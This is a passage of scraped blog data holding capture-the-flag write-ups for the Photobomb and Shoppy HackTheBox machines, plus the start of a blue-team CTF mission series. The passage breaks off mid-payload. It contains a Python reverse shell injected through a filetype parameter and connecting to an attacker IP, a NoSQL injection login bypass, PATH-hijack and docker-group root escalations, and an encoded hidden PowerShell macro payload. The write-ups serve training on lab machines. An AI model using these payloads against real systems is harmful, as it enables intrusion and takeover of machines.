a 200 responce: /photobomb.js -------------------------------- So, We have found a Javascript file called photobomb.js, Let\u0026rsquo;s see what is in it.\n1 2 3 4 5 6 7 function init() { // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) { document.getElementsByClassName(\u0026#39;creds\u0026#39;)[0].setAttribute(\u0026#39;href\u0026#39;,\u0026#39;http://pH0t0:b0Mb!@photobomb.htb/printer\u0026#39;); } } window.onload = init; Now, we have credientals to signup to the /printer page.\nCopy and paste the URL given above which is:\n1 http://pH0t0:b0Mb!@photobomb.htb/printer It opens a page contans a plenty of images and down there is a button to download any image we want.\nExploitation Let\u0026rsquo;s start burpsuite and intercept the downloading request.\nCommand Injection So, I have tried to command inject all the parameters with adding ;ls at the end of each parameter and see what happens.\nBeginning with photo parameter:\nlooks not injectable, Then trying on dimensions parameter:\nAlso, Not injectable.\nLastly, The filetype parameter:\nIt shows no response, so, It is injectable.\nLet\u0026rsquo;s prepare the reverse shell:\n1 python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.16.23\u0026#34;,4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;sh\u0026#34;)\u0026#39; And setup the listener:\n1 2 $ nc -nlvp 4321 listening on [any] 4321 ... And we got the reverse shell. Yay!\nLet\u0026rsquo;s respawn a tty:\n1 2 3 4 5 6 $ /usr/bin/script -qc /bin/bash /dev/null /usr/bin/script -qc /bin/bash /dev/null wizard@photobomb:~/photobomb$ id id uid=1000(wizard) gid=1000(wizard) groups=1000(wizard) wizard@photobomb:~/photobomb$ We have the access of the user called wizard.\nNow, We navigate to the home directory and get the user.txt\n1 2 3 4 5 6 7 8 9 10 11 12 13 wizard@photobomb:~/photobomb$ cd /home cd /home wizard@photobomb:/home$ ls ls wizard wizard@photobomb:/home$ cd wizard cd wizard wizard@photobomb:~$ ls ls photobomb user.txt wizard@photobomb:~$ cat user.txt cat user.txt 41ca28b0feb7e65XXXXXXXXXXXXXX Privilage Escalation Sudo -l 1 2 3 4 5 6 7 8 wizard@photobomb:~/photobomb$ sudo -l sudo -l Matching Defaults entries for wizard on photobomb: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User wizard may run the following commands on photobomb: (root) SETENV: NOPASSWD: /opt/cleanup.sh It looks like in order to have the root privilage, We only have that script:\n/opt/cleanup.sh\nThat we can run with the root privilage.\nif we have tried to run that script, We get:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 wizard@photobomb:/opt$ ./cleanup.sh ./cleanup.sh chown: changing ownership of \u0026#39;source_images/voicu-apostol-MWER49YaD-M-unsplash.JPG\u0026#39;: Operation not permitted chown: changing ownership of \u0026#39;source_images/masaaki-komori-NYFaNoiPf7A-unsplash.JPG\u0026#39;: Operation not permitted chown: changing ownership of \u0026#39;source_images/andrea-de-santis-uCFuP0Gc_MM-unsplash.JPG\u0026#39;: Operation not permitted chown: changing ownership of \u0026#39;source_images/tabitha-turner-8hg0xRg5QIs-unsplash.JPG\u0026#39;: Operation not permitted chown: changing ownership of \u0026#39;source_images/nathaniel-worrell-zK_az6W3xIo-unsplash.JPG\u0026#39;: Operation not permitted chown: changing ownership of \u0026#39;source_images/kevin-charit-XZoaTJTnB9U-unsplash.JPG\u0026#39;: Operation not permitted chown: changing ownership of \u0026#39;source_images/calvin-craig-T3M72YMf2oc-unsplash.JPG\u0026#39;: Operation not permitted chown: changing ownership of \u0026#39;source_images/eleanor-brooke-w-TLY0Ym4rM-unsplash.JPG\u0026#39;: Operation not permitted chown: changing ownership of \u0026#39;source_images/finn-whelen-DTfhsDIWNSg-unsplash.JPG\u0026#39;: Operation not permitted chown: changing ownership of \u0026#39;source_images/x.JPG\u0026#39;: Operation not permitted chown: changing ownership of \u0026#39;source_images/--reference=x.JPG\u0026#39;: Operation not permitted chown: changing ownership of \u0026#39;source_images/almas-salakhov-VK7TCqcZTlw-unsplash.JPG\u0026#39;: Operation not permitted chown: changing ownership of \u0026#39;source_images/mark-mc-neill-4xWHIpY2QcY-unsplash.JPG\u0026#39;: Operation not permitted chown: changing ownership of \u0026#39;source_images/wolfgang-hasselmann-RLEgmd1O7gs-unsplash.JPG\u0026#39;: Operation not permitted Let\u0026rsquo;s see what that script do:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 wizard@photobomb:/opt$ cat cleanup.sh cat cleanup.sh #!/bin/bash . /opt/.bashrc cd /home/wizard/photobomb # clean up log files if [ -s log/photobomb.log ] \u0026amp;\u0026amp; ! [ -L log/photobomb.log ] then /bin/cat log/photobomb.log \u0026gt; log/photobomb.log.old /usr/bin/truncate -s0 log/photobomb.log fi # protect the priceless originals find source_images -type f -name \u0026#39;*.JPG\u0026#39; -exec chown root:root {} \\; The script is copying the content of the photobomb.log and put in inside photobomb.log.old.\nand then truncate the content from it.\nSo, We will add /bin/bash in cd file and give read, write, execute permission.\nAnd then we run the file with sudo and set the PATH to /tmp.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 wizard@photobomb:/$ echo \u0026#34;/bin/bash\u0026#34; \u0026gt; /tmp/cd echo \u0026#34;/bin/bash\u0026#34; \u0026gt; /tmp/cd wizard@photobomb:/$ chmod 777 /tmp/cd chmod 777 /tmp/cd wizard@photobomb:/$ echo \u0026#34;/bin/bash\u0026#34; \u0026gt; /tmp/find echo \u0026#34;/bin/bash\u0026#34; \u0026gt; /tmp/find wizard@photobomb:/$ chmod 777 /tmp/find chmod 777 /tmp/find wizard@photobomb:/$ sudo PATH=/tmp:$PATH /opt/cleanup.sh sudo PATH=/tmp:$PATH /opt/cleanup.sh root@photobomb:/home/wizard/photobomb# id id uid=0(root) gid=0(root) groups=0(root) root@photobomb:/home/wizard/photobomb# cd /root cd /root root@photobomb:~# ls ls root.txt root@photobomb:~# cat root.txt cat root.txt c40917692c858d54a00xxxxxxxxxxxxxxx Pwned\n","date":"2022-11-10T00:00:00Z","image":"https://AbdallahAdham.com/post/Photobomb_HTB/photobomb_htb.jpg","permalink":"https://AbdallahAdham.com/p/photobomb-htb-writeup/","title":"Photobomb HTB Writeup"},{"content":" Scanning 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ─$ nmap 10.10.11.180 -A -oN nmap.txt Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-07 08:19 EST Stats: 0:00:05 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan Parallel DNS resolution of 1 host. Timing: About 0.00% done Stats: 0:00:07 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan Parallel DNS resolution of 1 host. Timing: About 0.00% done Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.29% done; ETC: 08:20 (0:00:00 remaining) Nmap scan report for 10.10.11.180 Host is up (0.21s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA) | 256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA) |_ 256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519) 80/tcp open http nginx 1.23.1 |_http-server-header: nginx/1.23.1 |_http-title: Did not follow redirect to http://shoppy.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 53.82 seconds Enumeration Subdomain Enumeration 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ─$ ffuf -w Discovery/DNS/bitquark-subdomains-top100000.txt -H \u0026#34;Host: FUZZ.shoppy.htb\u0026#34; -u http://shoppy.htb -t 10 -mc 200 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive \u0026lt;3 ________________________________________________ :: Method : GET :: URL : http://shoppy.htb :: Wordlist : FUZZ: Discovery/DNS/bitquark-subdomains-top100000.txt :: Header : Host: FUZZ.shoppy.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 10 :: Matcher : Response status: 200 ________________________________________________ mattermost [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 123ms] :: Progress: [100000/100000] :: Job [1/1] :: 64 req/sec :: Duration: [0:22:27] :: Errors: 0 :: Directory Enumeration $ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://shoppy.htb/FUZZ\nimages [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 157ms] login [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 124ms] admin [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 85ms] assets [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 90ms] css [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 83ms] Login [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 88ms] js [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 86ms] fonts [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 439ms] Admin [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 96ms] exports [Status: 301, Size: 181, Words: 7, Lines: 11, Duration: 160ms] [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 87ms] LogIn [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 143ms] LOGIN [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 118ms] :: Progress: [220560/220560] :: Job [1/1] :: 443 req/sec :: Duration: [0:09:27] :: Errors: 0 ::\nExploitation NoSQL Injection 1 2 username= admin\u0026#39;||\u0026#39;1==1 password= anything 1 2 3 [{\u0026#34;_id\u0026#34;:\u0026#34;62db0e93d6d6a999a66ee67a\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;23c6877d9e2b564ef8b32c3a23de27b2\u0026#34;}, {\u0026#34;_id\u0026#34;:\u0026#34;62db0e93d6d6a999a66ee67b\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;josh\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;6ebcea65320589ca4f2f1ce039975995\u0026#34;}] Hash Decryption 1 2 3 4 5 6 7 Josh Account: Hash: 6ebcea65320589ca4f2f1ce039975995 type: md5 result: remembermethisway SSH Reverse shell 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 Jaeger account: username: jaeger password: Sh0ppyBest@pp! ─$ nc jaeger@shoppy.htb jaeger@shoppy.htb password: Sh0ppyBest@pp! Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Nov 8 05:53:00 2022 from 10.10.14.38 jaeger@shoppy:~$ ls Desktop Documents Downloads Music Pictures Public ShoppyApp shoppy_start.sh Templates user.txt Videos User.txt 1 2 jaeger@shoppy:~$ cat user.txt b43c5028ab833b5XXXXXXXXXXXXXX Privilage Escalation Sudo -l 1 2 3 4 5 6 7 jaeger@shoppy:~$ sudo -l [sudo] password for jaeger: Matching Defaults entries for jaeger on shoppy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jaeger may run the following commands on shoppy: (deploy) /home/deploy/password-manager 1 2 3 jaeger@shoppy:~$ cat /home/deploy/password-manager Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported ! 1 2 3 4 5 6 7 jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager Welcome to Josh password manager! Please enter your master password: Sample Access granted! Here is creds ! Deploy Creds : username: deploy password: Deploying@pp! 1 2 3 4 5 6 7 8 9 10 11 12 13 $ ssh deploy@shoppy.htb deploy@shoppy.htb password: Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Nov 8 06:04:57 2022 from 10.10.14.38 $ id uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker) 1 2 3 4 5 $ docker run -v /:/mnt --rm -it alpine chroot /mnt sh # id uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo) $ cat root.txt e65b2ace8ff78062XXXXXXXXXXXX Pwned ","date":"2022-11-08T00:00:00Z","image":"https://AbdallahAdham.com/post/Shoppy_HTB/shoppy_htb.png","permalink":"https://AbdallahAdham.com/p/shoppy-htb-writeup/","title":"Shoppy HTB Writeup"},{"content":" Challenge_Name Points Tags 1-Something Suspicious 100 #mission #logging 2-Decrypting the payload 100 #mission #malware #forensics 3-Locked Outside 100 #mission #boot2root 4-Changing our locks and dumping old keys 100 #mission #reverse 5-Know your enemy 191 #mission #web 6-Blue team becomes Red Team 269 #mission #boot2root 7-Getting the crown jewels 269 #mission #ssh 8-Locating our Attacker 443 #mission #osint 9-Crime doesn\u0026rsquo;t pay 481 #mission 1-Something Suspicious It looks like we are in a blue team in a company and your duty is to investigate some suspicious activity through logs, let\u0026rsquo;s see !\nLet\u0026rsquo;s first open ftp.log and see what is inside it.\nmhmm, It looks like there was someone trying to connect to the FTP server and also trying to bruteforce the passcode for entering the server.\nbut there is one of the passwords looks weird and formatted as base64 which is ZmxhZ3tzMG0zdGgxbmc= let\u0026rsquo;s decode it and see it\u0026rsquo;s output.\nWell, it\u0026rsquo;s part of the flag flag{s0m3th1ng, I think that is the second part is located in the \u0026lsquo;ssh.log, let\u0026rsquo;s see it.\nAgain, Someone was trying to connect through ssh but the user\u0026rsquo;s name is also weird and looks like it\u0026rsquo;s base64 encode which is X3N1c3AxYzEwdXN9, let\u0026rsquo;s decode it and see.\nYes, It\u0026rsquo;s the second part pf the flag _susp1c10us}, Let\u0026rsquo;s merge the two parts together.\nThe first flag :\nflag{s0m3th1ng_susp1c10us}\n2-Decrypting the payload It seems that we were late and the hacker already gained access to our network, our duty is to invesigate a malicious macro-enabled spreadsheet which is Account_report.xlsm, and we will try to see if there is something suspicious inside of it.\nIn order to extract the macros out of the sheet we need to use a tool called olevba from Oletools, Lets do it.\n$ olevba Account_report.xlsm\nBy scrolling down we notice alot of suspicious Hex and Base64 which seems to be the payload that made the hacker gain access to the network.\nOkay, Let\u0026rsquo;s collect all of them together and remove all the unnecessary characters and decode them with Hex.\nThis is the collection of all Hex in the file.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 706f7765727368656c6c2e657865202d6578656320627970617373202d6e6f65786974202d772068696464656e202d656e6320204a41423041434141505141674143634157774245414777416241424a4147304163414276414849416441416f414677414967423141484d 415a51427941444d414d674175414751416241427341467741496741704146304149414277414855415967427341476b415977416741484d 4164414268414851416151426a414341415a514234414851415a51427941473441494142694147384162774273414341415577426f414738416477425841476b416267426b414738416477416f41476b41626742304143414161414268414734415a414273414755414c41416741476b41626742304143414163774230414745416441426c41436b41 4f77416e414473414451414b414745415a41426b4143304164414235414841415a5141674143304162674268414730415a5141674148634161514275414341414c5142744147554162514269414755416367416741435141644141674143304162674268414730415a51427a414841415951426a41475541494142754147454164414270414859415a51413741467341626742684148514161514232414755414c67423341476b416267426441446f414f674254414767416277423341466341615142754147514162774233414367414b41426241464d 416551427a414851415a5142744143344152414270414745415a774275414738416377423041476b415977427a4143344155414279414738415977426c41484d 416377426441446f414f674248414755416441424441485541636742794147554162674230414641416367427641474d415a51427a41484d414b4141704143414166414167414563415a5142304143304155414279414738415977426c41484d 4163774170414334415451426841476b416267425841476b416267426b4147384164774249414745416267426b414777415a514173414341414d 414170414473414451414b41476b415a514234414341414b41416741467341557742304148494161514275414563415851413641446f416167427641476b416267416f414363414a774173414341414b4142624148494152514248414755415741426441446f414f67424e414745415641426a414767415a514254414367414941416941436b414941416e414867414a774172414630414d 774178414673415241424a414777415441426c414567416377416b41437341585141784146734152414270414577415441426c414767416377416b414341414b41416d4148774149414170414451414d774178414673415241424a414777415441426c414567416377416b41437341585141784146734152414270414577415441426c414767416377416b414341414b41416d4148774149414170414451414d 774264414649415151426f41474d4157774264414563416267424a414649415641427a414673414c41416e4148514157414271414363414b41426c41474d415151424d4146414152514253414334414b51416e414351414a774173414363416477427841476b414a77416f41475541517742424145774155414246414649414c674170414363414f774230414667414a774172414363416167427a41474d 414d41426b414638415a41417a4147774159674130414734414d 774266414441416367426a414451416251416e414373414a774237414763414a774172414363415951416e414373414a774273414759416441425941476f414941416e414373414a774139414445415877426e414745414a774172414363416241426d4148634163514270414363414b414169414377414a774175414363414c414167414363415567416e414373414a77427041456341534142554148514154774273414363414b77416e414755415a674230414363414941417041434141664141674147594162774279414555415151426a414567414c514276414549415367426c41474d 4156414167414873414a41426641433441566742424145774156514246414830414941417041436b4149414170414473414451414b41464d 4152514230414341414b414169414563414f414169414373414967426f414349414b5141674143674149414169414341414b51416741436b414e67417a41463041556742684147674159774262414377414a774279414745415767416e4145554159774268414777415541426c414649414c514167414451414d 774264414649415951426f41474d415777417341436b414d41413141463041556742684147674159774262414373414f41413341463041556742684147674159774262414373414f5141304146304155674268414767415977426241436741494141674147554151774242414777416341424641464941597741744143414149414170414363414f774179414363414b77416e414534414a774172414363414d 51416e414373414a77423941484d4164514177414849414d77426e414363414b77416e414734414e41426b414638414d774279414451414a7741724143634158774179414534414d 5141674144304149414179414638415a774268414363414b77416e414777415a674279414363414b77416e414745415767416e414367414b4141674143674149414170414363414a77427541476b4154774271414330414a774234414363414b77426441444d 414c414178414673414b51416f414563415467427041484941564142544147384164414175414555415977424f414755416367426c414559415a514253414841415251427a4145384151674253414555416467416b414341414b41416741433441494141694143414149414170414341414f77417441476f415477424a414734414941416f4143414162414254414341414b4141694146594151514253414349414b77416941456b4159514243414349414b77416941457741525141364147634149674172414349414f414249414349414b514167414341414b514175414659415151424d 414855415a514262414341414c514167414445414c674175414341414c514167414367414941416f4143414162414254414341414b4141694146594151514253414349414b77416941456b4159514243414349414b77416941457741525141364147634149674172414349414f414249414349414b514167414341414b514175414659415151424d 414855415a514175414577415a514275414763416441424941436b4158514167414877414941424a414755415741414e41416f414a4142774147454165514273414738415951426b414341415051416741434941536742424145494161674242414563416477424241474541555142434147774151514248414451415151426b414545415151426e414545415241417741454541535142424145494154774242414563415651424241475141647742424148514151514246414467415151425a414763415167427841454541527742564145454157514233414549414d 41424241454d415151424241465541647742434144554151514249414530415151426b41454541516742734145454152774177414545415441426e414549415477424241456341565142424147514151514242414855415151424741453041515142694148634151674271414545415277427a4145454157674252414549414d 4142424145674154514242414577415a774243414655415151424641453041515142564145454151674245414545415277423341454541595142524145494162414242414563414e4142424147514151514242414738415151424441456b415151424e4146454151514131414545415241424a414545415441426e414545416477424241454d 414e414242414530415a7742424148554151514245414555415151424e4148634151514235414545415177424a4145454154414242414545414d41424241455141555142424145304164774242414841415151424541484d 415151424b41454541516742364145454153414252414545415977426e4145494162414242414563415251424241474941555142424147634151514245414441415151424a4145454151514272414545415277424e414545415967424241454941634142424145634156514242414749415a77424341444141515142444144514151514253414863415167427341454541534142524145454156514233414549414d 414242414567415351424241466f41555142434147674151514248414441415151424c4145454151514277414545415241427a4145454156774233414549416151424241456741617742424147514151514243414777415151424741484d 4151514259414645415167426b4145454151774252414545415751426e414549414e514242414567415551424241466f415551424341486f41515142444145454151514251414645415151426e4145454152414242414545415441426e4145454164514242414551415751424241453441555142424144454151514245414530415151424f41464541516741344145454151774256414545415a5142334145454164774242414567414d414242414538416477424341444d 41515142484147634151514268414645415167427a41454541527742564145454153774242414545416277424241454d 415551424241474541555142424147634151514245414441415151424a4145454151514272414545415341424e414545415a4142424145494165514242414563415651424241466b415551424341485141515142444144514151514256414763415167427341454541527742464145454157674242414545416277424241454d 415551424241466b415a77424341445541515142494146454151514261414645415167423641454541517742334145454153514242414545416477424241454d 416477424241456b4151514242414773415151424841456b415151426c4146454151674177414545415277425641454541597742334145454164514242414555416477424241466f4155514243414855415151424841474d415151426b414545415167427641454541517742724145454153774252414545415a77424241454d414d 414242414749415a7742434147774151514244414545415151424e4145454151514277414545415341427a41454541547742334145454161774242414563415551424241466b41555142434144414151514248414555415151424a4145454151514135414545415177424241454541537742424145494154774242414563415651424241475141647742424148514151514246414467415151425a414763415167427841454541527742564145454157514233414549414d 41424241454d415151424241457741555142434146554151514249414773415151426a4145454151674273414545415251413041454541575142524145494164414242414563415651424241456b41515142434146514151514249414773415151426a4148634151674177414545415277425641454541596742524145454164514242414559415551424241466f41555142434144514151514249414645415151424d4147634151674243414545415267424e41454541555142334145494153674242414555416177424241464941555142434148554151514248414530415151426941486341516742724145454152774272414545415967426e414549416267424241454d 4161774242414577415a7742434145674151514248414655415151426b41454541516742554145454153414252414545415977426e4145494163414242414563414e41424241466f41647742424147384151514244414645415151425a414763415167413141454541534142524145454157674252414549416567424241454d 4164774242414530415151424241484d4151514244414545415151424b4145454151674277414545415177427241454541547742334145454161774242414567415451424241466f41555142434148554151514248414645415151425a414763415167426f414545415277424e4145454159514233414545415a774242414551414d 41424241456b4151514242414738415151424841477341515142614146454151674130414545415177424241454541536742424145494161774242414563415251424241475141515142434147674151514244414545415151424e4147634151514172414545415177425a4145454154514252414545415a774242414567416477424241456b41515142434146414151514249414655415151426b4145454151514230414545415267424e414545415a41424241454941655142424145634161774242414749415a7742434147344151514244414545415151424c4146454151514133414545415177425241454541597742334145494162414242414563414e41424241466f415151424341476b4151514248414555415151425a4148634151674279414545415241424a4145454153514242414545415a774242414551414d 41424241456b41515142424147734151514249414530415151426141464541516742314145454152774252414545415751426e414549416141424241456341545142424147454164774242414763415151424441484d 415151424a414545415151427041454541526742424145454156514233414545415a77424241454d415351424241456b41515142424148494151514244414545415151424c4145454151674233414545415341426a4145454157674242414545416341424241454d 414e414242414655415151424341476741515142494146454151514268414545415151426e414545415177427a41454541535142424145454161514242414551414e41424241456b415151424241476b415151424541484d 415151424b41454541516742364145454152774256414545415967426e4145494161774242414563415351424241475541555142434144414151514248414655415151424a4145454151514135414545415177424241454541537742424145494159674242414567415551424241466f41555142434144514151514249414645415151424d 414763415167427341454541527741304145454157514233414549416467424241456341555142424147454155514243414855415151424841474d41515142594146454151514132414545415241427641454541555142524145494156414242414555415451424241464d 415551424341456f4151514244414773415151424d 41476341516742494145454152774256414545415a4142424145494151774242414567416177424241475141515142434147774151514249414530415151424c4145454151514272414545415341424e41454541576742524145494164514242414563415551424241466b415a7742434147674151514248414530415151426841486341515142354145454151774272414545415477423341454541617742424145674154514242414751415151424341486b4151514248414655415151425a4146454151674230414545415177413041454541566742334145494165514242414563416177424241475141515142434147774151514244414763415151424b41454541516742364145454152774256414545415967426e4145494161774242414563415351424241475541555142434144414151514248414655415151424d 41454541515142334145454151774233414545415367424241454941656742424145634156514242414749415a774243414773415151424841456b415151426c41464541516741774145454152774256414545415441426e41454941545142424145634156514242414749415a774243414734415151424941464541515142684145454151514277414545415241427a41454541536742424145494165674242414567415551424241474d 415a774243414777415151424841455541515142694146454151514231414545415251425a4145454159674242414549414d514242414567415451424241474541515142424147384151514244414773415151426d4146454151514133414545415177425241454541575142334145494163774242414563416177424241466f41555142434148554151514249414645415151424d 414763415167424541454541527742334145454159674233414549416567424241456341565142424145734151514242414841415151424541484d4151514169414130414367416b41474d 4149414139414341415777425441486b41637742304147554162514175414651415a514234414851414c67424641473441597742764147514161514275414763415851413641446f415651427541476b4159774276414751415a514175414563415a51423041464d416441427941476b416267426e414367415777425441486b4163774230414755416251417541454d 4162774275414859415a514279414851415851413641446f41526742794147384162514243414745416377426c414459414e4142544148514163674270414734415a77416f414351416341426841486b4162414276414745415a41417041436b414451414b41476b415a674167414367414a4142774147454165514273414738415951426b414341414c514274414745416441426a41476741494141694147674164414230414841414f67423841476741644142304148414163774136414349414b514167414873414451414b4143414149414167414341414a4142774147454165514273414738415951426b4143414150514167414367415467426c414863414c514250414749416167426c41474d 4164414167414349415467426c414851414c674258414755415967426a414777416151426c414734416441416941436b414c6742454147384164774275414777416277426841475141557742304148494161514275414763414b41416b41484141595142354147774162774268414751414b514137414130414367423941413041436742704147554165414167414351415977413741413d3d Now after decoding from Hex, This is the result.\n1 powershell.exe -exec bypass -noexit -w hidden -enc JAB0ACAAPQAgACcAWwBEAGwAbABJAG0AcABvAHIAdAAoAFwAIgB1AHMAZQByADMAMgAuAGQAbABsAFwAIgApAF0AIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAUwBoAG8AdwBXAGkAbgBkAG8AdwAoAGkAbgB0ACAAaABhAG4AZABsAGUALAAgAGkAbgB0ACAAcwB0AGEAdABlACkAOwAnADsADQAKAGEAZABkAC0AdAB5AHAAZQAgAC0AbgBhAG0AZQAgAHcAaQBuACAALQBtAGUAbQBiAGUAcgAgACQAdAAgAC0AbgBhAG0AZQBzAHAAYQBjAGUAIABuAGEAdABpAHYAZQA7AFsAbgBhAHQAaQB2AGUALgB3AGkAbgBdADoAOgBTAGgAbwB3AFcAaQBuAGQAbwB3ACgAKABbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0AFAAcgBvAGMAZQBzAHMAKAApACAAfAAgAEcAZQB0AC0AUAByAG8AYwBlAHMAcwApAC4ATQBhAGkAbgBXAGkAbgBkAG8AdwBIAGEAbgBkAGwAZQAsACAAMAApADsADQAKAGkAZQB4ACAAKAAgAFsAUwB0AHIAaQBuAEcAXQA6ADoAagBvAGkAbgAoACcAJwAsACAAKABbAHIARQBHAGUAWABdADoAOgBNAGEAVABjAGgAZQBTACgAIAAiACkAIAAnAHgAJwArAF0AMwAxAFsARABJAGwATABlAEgAcwAkACsAXQAxAFsARABpAEwATABlAGgAcwAkACAAKAAmAHwAIAApADQAMwAxAFsARABJAGwATABlAEgAcwAkACsAXQAxAFsARABpAEwATABlAGgAcwAkACAAKAAmAHwAIAApADQAMwBdAFIAQQBoAGMAWwBdAEcAbgBJAFIAVABzAFsALAAnAHQAWABqACcAKABlAGMAQQBMAFAARQBSAC4AKQAnACQAJwAsACcAdwBxAGkAJwAoAGUAQwBBAEwAUABFAFIALgApACcAOwB0AFgAJwArACcAagBzAGMAMABkAF8AZAAzAGwAYgA0AG4AMwBfADAAcgBjADQAbQAnACsAJwB7AGcAJwArACcAYQAnACsAJwBsAGYAdABYAGoAIAAnACsAJwA9ADEAXwBnAGEAJwArACcAbABmAHcAcQBpACcAKAAiACwAJwAuACcALAAgACcAUgAnACsAJwBpAEcASABUAHQATwBsACcAKwAnAGUAZgB0ACcAIAApACAAfAAgAGYAbwByAEUAQQBjAEgALQBvAEIASgBlAGMAVAAgAHsAJABfAC4AVgBBAEwAVQBFAH0AIAApACkAIAApADsADQAKAFMARQB0ACAAKAAiAEcAOAAiACsAIgBoACIAKQAgACgAIAAiACAAKQAgACkANgAzAF0AUgBhAGgAYwBbACwAJwByAGEAWgAnAEUAYwBhAGwAUABlAFIALQAgADQAMwBdAFIAYQBoAGMAWwAsACkAMAA1AF0AUgBhAGgAYwBbACsAOAA3AF0AUgBhAGgAYwBbACsAOQA0AF0AUgBhAGgAYwBbACgAIAAgAGUAQwBBAGwAcABFAFIAYwAtACAAIAApACcAOwAyACcAKwAnAE4AJwArACcAMQAnACsAJwB9AHMAdQAwAHIAMwBnACcAKwAnAG4ANABkAF8AMwByADQAJwArACcAXwAyAE4AMQAgAD0AIAAyAF8AZwBhACcAKwAnAGwAZgByACcAKwAnAGEAWgAnACgAKAAgACgAIAApACcAJwBuAGkATwBqAC0AJwB4ACcAKwBdADMALAAxAFsAKQAoAEcATgBpAHIAVABTAG8AdAAuAEUAYwBOAGUAcgBlAEYAZQBSAHAARQBzAE8AQgBSAEUAdgAkACAAKAAgAC4AIAAiACAAIAApACAAOwAtAGoATwBJAG4AIAAoACAAbABTACAAKAAiAFYAQQBSACIAKwAiAEkAYQBCACIAKwAiAEwARQA6AGcAIgArACIAOABIACIAKQAgACAAKQAuAFYAQQBMAHUAZQBbACAALQAgADEALgAuACAALQAgACgAIAAoACAAbABTACAAKAAiAFYAQQBSACIAKwAiAEkAYQBCACIAKwAiAEwARQA6AGcAIgArACIAOABIACIAKQAgACAAKQAuAFYAQQBMAHUAZQAuAEwAZQBuAGcAdABIACkAXQAgAHwAIABJAGUAWAANAAoAJABwAGEAeQBsAG8AYQBkACAAP